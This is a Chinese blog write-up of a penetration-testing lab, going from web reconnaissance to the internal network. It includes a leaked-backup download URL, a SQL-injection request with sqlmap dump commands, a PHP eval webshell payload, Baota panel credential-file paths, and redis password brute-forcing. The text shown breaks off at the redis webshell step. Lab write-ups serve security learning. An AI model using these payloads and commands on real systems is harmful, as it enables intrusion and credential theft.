@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶场拓扑 主要考点暗月实战项目十一是从外网打点到内网再到域控，三层内网渗透，通过外网WEB站点的信息获取源码，再到审计突破，再到内网。到了内网通过信息收集、横向移动发现更多存活主机，通过信息整理得到工作组边界设备的权限，再通过Exchange漏洞获取核心区域访问权限，最后再拿下域控权限。 技术点涉及基础的php代码审计、win系统的宝塔提权、cs\msf实战渗透环境、shellcode免杀过火绒、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从外网打点到内网域实战 - cncat WriteUp">
+<meta property="og:url" content="http://example.com/posts/2648142726/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="靶场拓扑 主要考点暗月实战项目十一是从外网打点到内网再到域控，三层内网渗透，通过外网WEB站点的信息获取源码，再到审计突破，再到内网。到了内网通过信息收集、横向移动发现更多存活主机，通过信息整理得到工作组边界设备的权限，再通过Exchange漏洞获取核心区域访问权限，最后再拿下域控权限。 技术点涉及基础的php代码审计、win系统的宝塔提权、cs\msf实战渗透环境、shellcode免杀过火绒、">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525204532644.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525103132722.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525103229549.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525103315553.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525104358597.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525104827832.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525104924060.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525110137779.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525105422469.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525105503415.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525110942285.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525191104932.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525191133172.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525111450932.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525112839441.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525125832944.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525125847641.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525130019799.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525141933539.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525142253521.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525144308654.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525153616494.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525153717757.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525153822706.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525154015334.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525154307969.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525154417391.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525154927615.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525155038591.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525155300170.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525155759605.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525160220018.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525160352564.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525161120977.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525162500532.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525163105871.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525163640740.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525163943191.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525164814315.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525164722465.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525164917047.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525165052553.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525165146447.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525165237293.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525182421990.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525184151977.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525182520543.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525173903653.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525174008829.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525182746070.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525185825620.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525190051498.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525185937711.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525190208416.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525190217672.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525190248697.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525190350985.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525190555554.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525190654506.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525190927658.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525203555428.png">
+<meta property="article:published_time" content="2022-05-25T02:26:04.000Z">
+<meta property="article:modified_time" content="2022-05-25T13:54:58.801Z">
+<meta property="article:author" content="1in3r">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typro-1304950244.file.myqcloud.com/image-20220525204532644.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>从外网打点到内网域实战 - cncat WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/1632241034/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/2648142726/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/2648142726/&text=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/2648142726/&is_video=false&description=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从外网打点到内网域实战 - cncat WriteUp&body=Check out this article: http://example.com/posts/2648142726/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/2648142726/&title=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/2648142726/&name=从外网打点到内网域实战 - cncat WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/2648142726/&t=从外网打点到内网域实战 - cncat WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91"><span class="toc-number">1.</span> <span class="toc-text">靶场拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E8%80%83%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">主要考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">网站源码备份文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E8%8E%B7%E5%BE%97%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">数据库备份获得管理员账户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%BE%97%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">SQL注入获得管理员账户密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%BD%91%E7%AB%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6Getshll"><span class="toc-number">4.</span> <span class="toc-text">修改网站配置文件Getshll</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-Disable-Function"><span class="toc-number">4.1.</span> <span class="toc-text">Bypass Disable Function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass%E7%81%AB%E7%BB%92%E4%B8%8A%E7%BA%BFCS"><span class="toc-number">4.2.</span> <span class="toc-text">Bypass火绒上线CS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">6.</span> <span class="toc-text">内网横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%86%99webshell"><span class="toc-number">6.1.</span> <span class="toc-text">redis写webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exchange-RCE-CVE-2020-0688"><span class="toc-number">6.2.</span> <span class="toc-text">Exchange RCE CVE-2020-0688</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC%E4%B8%8A%E7%BA%BF"><span class="toc-number">6.3.</span> <span class="toc-text">DC上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">7.</span> <span class="toc-text">结束</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        从外网打点到内网域实战 - cncat WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">1in3r</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-25T02:26:04.000Z" itemprop="datePublished">2022-05-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="靶场拓扑"><a href="#靶场拓扑" class="headerlink" title="靶场拓扑"></a>靶场拓扑</h2><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525204532644.png" alt="image-20220525204532644"></p>
+<h2 id="主要考点"><a href="#主要考点" class="headerlink" title="主要考点"></a>主要考点</h2><p>暗月实战项目十一是从外网打点到内网再到域控，三层内网渗透，通过外网WEB站点的信息获取源码，再到审计突破，再到内网。到了内网通过信息收集、横向移动发现更多存活主机，通过信息整理得到工作组边界设备的权限，再通过Exchange漏洞获取核心区域访问权限，最后再拿下域控权限。</p>
+<p>技术点涉及基础的php代码审计、win系统的宝塔提权、cs\msf实战渗透环境、shellcode免杀过火绒、内网漫游、三层网络、redis windows写shell、windwos防火墙配置、socks代理隧道应用，Exchange漏洞命令执行，打域控技巧等。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -vv -Pn www.cocat.cc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525103132722.png" alt="image-20220525103132722"></p>
+<p>80端口是一个网络用户管理系统</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525103229549.png" alt="image-20220525103229549"></p>
+<p>8888端口是宝塔面板</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525103315553.png" alt="image-20220525103315553"></p>
+<h3 id="网站源码备份文件泄露"><a href="#网站源码备份文件泄露" class="headerlink" title="网站源码备份文件泄露"></a>网站源码备份文件泄露</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://www.cocat.cc</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525104358597.png" alt="image-20220525104358597"></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>数据库配置文件，得到数据库备份密码</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525104827832.png" alt="image-20220525104827832"></p>
+<p>hash可撞裤</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525104924060.png" alt="image-20220525104924060"></p>
+<p>搜索关键词： “备份密码” 找到一个请求方法，定位到一个关键文件admin_data.php</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525110137779.png" alt="image-20220525110137779"></p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525105422469.png" alt="image-20220525105422469"></p>
+<p>直接访问kss_admin&#x2F;admin_data.php提示未知的action请求！</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525105503415.png" alt="image-20220525105503415"></p>
+<p>结合以上推测需要构造一个action请求</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/kss<span class="built_in">_</span>admin/admin<span class="built_in">_</span>data.php?action=mysqldatabak<span class="built_in">_</span>down<span class="built_in">&amp;</span>pwd=adminadminadmin</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据库备份获得管理员账户密码"><a href="#数据库备份获得管理员账户密码" class="headerlink" title="数据库备份获得管理员账户密码"></a>数据库备份获得管理员账户密码</h3><p>直接访问链接下载数据库备份文件，将数据库备份文件导入数据库恢复</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525110942285.png" alt="image-20220525110942285"></p>
+<p>本地还原</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525191104932.png" alt="image-20220525191104932"></p>
+<p>管理账户密码</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525191133172.png" alt="image-20220525191133172"></p>
+<h3 id="SQL注入获得管理员账户密码"><a href="#SQL注入获得管理员账户密码" class="headerlink" title="SQL注入获得管理员账户密码"></a>SQL注入获得管理员账户密码</h3><p>注入点位于</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/kss<span class="built_in">_</span>inc/payapi<span class="built_in">_</span>return2.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525111450932.png" alt="image-20220525111450932"></p>
+<p>构造POST请求包</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /kss<span class="built_in">_</span>inc/payapi<span class="built_in">_</span>return2.php HTTP/1.1</span><br><span class="line">Host: www.cocat.cc</span><br><span class="line">Content-Length: 71</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://www.cocat.cc/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: xxx.xxx.xxx</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://www.cocat.cc/kss<span class="built_in">_</span>inc/payapi<span class="built_in">_</span>return2.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: www.cocat.cc</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">v<span class="built_in">_</span>oid=*<span class="built_in">&amp;</span>v<span class="built_in">_</span>pstatus=20<span class="built_in">&amp;</span>v<span class="built_in">_</span>amount=1<span class="built_in">&amp;</span>v<span class="built_in">_</span>moneytype=1<span class="built_in">&amp;</span>remark1=1<span class="built_in">&amp;</span>v<span class="built_in">_</span>md5str=121212</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap一把嗦</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt  --dbms mysql -v 1 -p v_oid --dbs --bacth</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525112839441.png" alt="image-20220525112839441"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt  --dbms mysql -v 1 -p v_oid -D www_cocat_cc -T kss_tb_manager -C username,password --dump  --random-agent --threads 4</span><br></pre></td></tr></table></figure>
+
+<p>SQL注入得到管理员账户密码</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525125832944.png" alt="image-20220525125832944"></p>
+<p>密码hash可撞 admin:moon@123</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525125847641.png" alt="image-20220525125847641"></p>
+<h2 id="修改网站配置文件Getshll"><a href="#修改网站配置文件Getshll" class="headerlink" title="修改网站配置文件Getshll"></a>修改网站配置文件Getshll</h2><p>使用<strong>admin:moon@123</strong>登陆网络用户管理系统后台</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525130019799.png" alt="image-20220525130019799"></p>
+<p>系统设置里的配置项会被写入_config.php文件，那么可以修改网站相关配置项直接getshell</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525141933539.png" alt="image-20220525141933539"></p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);@eval(<span class="built_in">$</span><span class="built_in">_</span>POST[1]);(&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525142253521.png" alt="image-20220525142253521"></p>
+<p>连接地址：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.cocat.cc/kss<span class="built_in">_</span>inc/<span class="built_in">_</span>config.php</span><br></pre></td></tr></table></figure>
+
+<p>成功连接，但是无法执行命令</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525144308654.png" alt="image-20220525144308654"></p>
+<h3 id="Bypass-Disable-Function"><a href="#Bypass-Disable-Function" class="headerlink" title="Bypass Disable Function"></a>Bypass Disable Function</h3><p>宝塔把大部分能执行命令的函数都禁用了，绕不过，看到当前权限是system，那直接去日宝塔吧</p>
+<p>翻配置文件得到宝塔安全入口地址</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/BtSoft/panel/data/admin<span class="built_in">_</span>path.pl <span class="params">#</span>e1VOsmtO</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525153616494.png" alt="image-20220525153616494"></p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525153717757.png" alt="image-20220525153717757"></p>
+<p>配置文件中可以找到宝塔初始默认密码</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/BtSoft/panel/data/default.pl <span class="params">#</span>jSKyFFdj</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525153822706.png" alt="image-20220525153822706"></p>
+<p>宝塔登陆账号储存在default.db内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/BtSoft/panel/data/default.db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525154015334.png" alt="image-20220525154015334"></p>
+<p>下载default.db文件，本地打开找到登陆用户名<strong>gOXZQjWA</strong></p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525154307969.png" alt="image-20220525154307969"></p>
+<p>使用gOXZQjWA:jSKyFFdj登陆宝塔后台</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525154417391.png" alt="image-20220525154417391"></p>
+<p>把禁用函数的配置改了</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525154927615.png" alt="image-20220525154927615"></p>
+<p>对不起，这一次我选择全删，小孩子才做选择，改完配置之后正常执行命令（把system函数恢复就够了）</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525155038591.png" alt="image-20220525155038591"></p>
+<p>查一下杀软，有可爱的火绒</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525155300170.png" alt="image-20220525155300170"></p>
+<h3 id="Bypass火绒上线CS"><a href="#Bypass火绒上线CS" class="headerlink" title="Bypass火绒上线CS"></a>Bypass火绒上线CS</h3><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525155759605.png" alt="image-20220525155759605"></p>
+<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>抓账户明文hash密码</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525160220018.png" alt="image-20220525160220018"></p>
+<p>网络配置</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525160352564.png" alt="image-20220525160352564"></p>
+<p>扫一下192.168.189.161&#x2F;24网段的存活</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525161120977.png" alt="image-20220525161120977"></p>
+<h2 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h2><p>socks代理进内网，nmap扫描192.168.189.162，目标开放了6379、80等端口</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525162500532.png" alt="image-20220525162500532"></p>
+<p>工具连上去竟然提示未认证，看来不是redis未授权</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525163105871.png" alt="image-20220525163105871"></p>
+<p>hydra爆破一下密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy hydra -P  /root/tools/SecLists/Passwords/2020-200_most_used_passwords.txt 192.168.189.162 redis 6379</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220525163640740.png" alt="image-20220525163640740"></p>
+<h3 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h3><p>连接redis</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy ./redis-cli -h 192.168.189.162 -a 123456789qq</span><br></pre></td></tr></table></figure>
+
